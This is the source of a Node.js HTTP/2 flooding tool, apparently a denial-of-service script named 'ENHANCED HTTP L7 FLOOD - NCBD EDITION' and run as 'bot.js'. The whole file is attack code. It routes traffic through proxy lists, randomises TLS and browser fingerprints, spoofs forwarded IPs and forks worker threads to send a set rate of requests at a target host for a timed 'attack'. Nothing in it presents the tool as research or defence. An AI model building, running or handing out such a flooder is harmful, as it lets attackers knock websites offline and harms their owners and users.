const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");
const cheerio = require("cheerio");
const gradient = require("gradient-string");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (exception) {});

if (process.argv.length < 7 && process.argv[2] !== "--status") {
    console.log(gradient.vice(`[!] node bot.js <HOST> <TIME> <RPS> <THREADS> <PROXY>`));
    process.exit();
}

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

const targetURL = process.argv[2];
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error("Request Timed Out"));
        }, 5000);
    });

    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`${getCurrentTime()} [HTTP.js] Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
            process.exit(0);
        })
        .catch((error) => {
            if (error.message === "Request Timed Out") {
                console.log(`${getCurrentTime()} [HTTP.js] Request Timed Out`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`${getCurrentTime()} [HTTP.js] Title: ${extractedTitle}`);
            } else {
                console.log(`${getCurrentTime()} [HTTP.js] ${error.message}`);
            }
            process.exit(1);
        });
}

function getTitleFromHTML(html) {
    const $ = cheerio.load(html);
    return $("title").text() || "Not Found";
}

if (process.argv[2] === "--status") {
    getStatus();
    process.exit(0);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const sig = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha256",
    "rsa_pss_rsae_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512",
];

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];

const lang_header = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.8",
    "es-ES,es;q=0.9",
];

const encoding_header = ["gzip, deflate, br"];
const control_header = ["no-cache", "max-age=0"];

const refers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
];

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", (chunk) => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (error) => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const spoofed = ip_spoof();

    const cipper = randomElement(cplist);
    const siga = randomElement(sig);
    const uap1 = randomElement(uap);
    const Ref = randomElement(refers);
    const accept = randomElement(accept_header);
    const lang = randomElement(lang_header);
    const encoding = randomElement(encoding_header);
    const control = randomElement(control_header);

    // Randomize path with common endpoints to stress server
    const endpoints = [
        "/",
        "/index.html",
        "/login",
        "/api",
        "/search?q=" + randstr(10),
        "/profile/" + randstr(8),
        "/static/" + randstr(12) + ".js",
    ];
    const path = randomElement(endpoints) + "?" + randstr(5) + "=" + randstr(25);

    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers[":path"] = path;
    headers[":scheme"] = "https";
    headers["x-forwarded-proto"] = "https";
    headers["accept-language"] = lang;
    headers["accept-encoding"] = encoding;
    headers["x-forwarded-for"] = spoofed;
    headers["cache-control"] = control;
    headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
    headers["sec-ch-ua-mobile"] = "?0";
    headers["sec-ch-ua-platform"] = "Windows";
    headers["referer"] = Ref + "?" + randstr(15);
    headers["origin"] = "https://" + parsedTarget.host;
    headers["accept"] = accept;
    headers["user-agent"] = uap1;
    headers["sec-fetch-dest"] = "document";
    headers["sec-fetch-mode"] = "navigate";
    headers["sec-fetch-site"] = "none";
    headers["sec-fetch-user"] = "?1";
    headers["x-requested-with"] = "XMLHttpRequest";

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            sigalgs: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:X25519",
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false,
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {});
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {});
    });
}

if (cluster.isMaster) {
    console.clear();
    console.log(gradient.vice(`
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           ENHANCED HTTP L7 FLOOD - NCBD EDITION
           Usage: node bot.js <HOST> <TIME> <RPS> <THREADS> <PROXY>
    `));

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        console.log(`${getCurrentTime()} [HTTP.js] Attack Thread ${counter} Started`);
    }
    console.log(`${getCurrentTime()} [HTTP.js] The Attack Has Started`);

    setInterval(() => getStatus(), 2000);
    setTimeout(() => {
        console.log(`${getCurrentTime()} [HTTP.js] The Attack Is Over`);
        process.exit(1);
    }, args.time * 1000);
} else {
    setInterval(runFlooder);
}
